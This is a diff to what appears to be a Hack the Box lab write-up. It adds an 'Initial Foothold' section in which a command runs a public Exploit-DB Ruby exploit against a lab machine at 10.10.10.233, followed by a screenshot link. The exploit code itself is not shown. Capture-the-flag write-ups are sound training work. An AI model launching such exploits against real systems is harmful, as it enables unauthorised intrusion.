@@ -110,3 +110,9 @@ root@kali# searchsploit -x php/webapps/44449.rb
 ```shell
 root@kali# searchsploit -x php/webapps/44449.rb
 ```
+
+## Initial Foothold
+```shell
+root@kali# ruby 44449.rb http://10.10.10.233
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/2a3f60b5-c3ef-4d41-a291-f752776f758b)
